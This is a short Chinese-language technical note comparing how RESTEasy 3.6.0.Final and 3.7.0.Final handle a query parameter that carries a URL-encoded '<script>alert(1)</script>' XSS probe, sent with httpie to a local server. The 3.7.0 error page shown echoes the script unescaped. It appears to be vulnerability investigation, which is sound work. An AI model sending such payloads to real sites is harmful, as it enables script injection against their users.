```bash
$ http "localhost:8080/rest/users?paging=1"
```

```bash
$ http "http://localhost:8080/rest/users?paging=0%2c-1sp137%3Cscript%3Ealert(1)%3C%2fscript%3Emzx4u"
```

在`resteasy 3.6.0.Final`下的表现：

```bash
$ http "http://localhost:8080/rest/users?paging=0%2c-1sp137%3Cscript%3Ealert(1)%3C%2fscript%3Emzx4u"
HTTP/1.1 404 Not Found
Content-Length: 0
Date: Wed, 25 Mar 2020 12:25:43 GMT
Server: Jetty(9.4.24.v20191120)



$
```

在`resteasy 3.7.0.Final`下的表现：

```bash
$ http "http://localhost:8080/rest/users?paging=0%2c-1sp137%3Cscript%3Ealert(1)%3C%2fscript%3Emzx4u"
HTTP/1.1 404 Not Found
Content-Length: 234
Content-Type: text/html;charset=utf-8
Date: Wed, 25 Mar 2020 12:26:49 GMT
Server: Jetty(9.4.24.v20191120)

RESTEASY003870: Unable to extract parameter from http request: javax.ws.rs.QueryParam("paging") value is '0,-1sp137<script>alert(1)</script>mzx4u' for public java.lang.Integer io.weli.resteasy.xss.UsersResource.page(java.lang.Integer)

$
```

结论：`3.6.0.Final`和`3.7.0.Final`之间的某些变化导致了行为的不同。

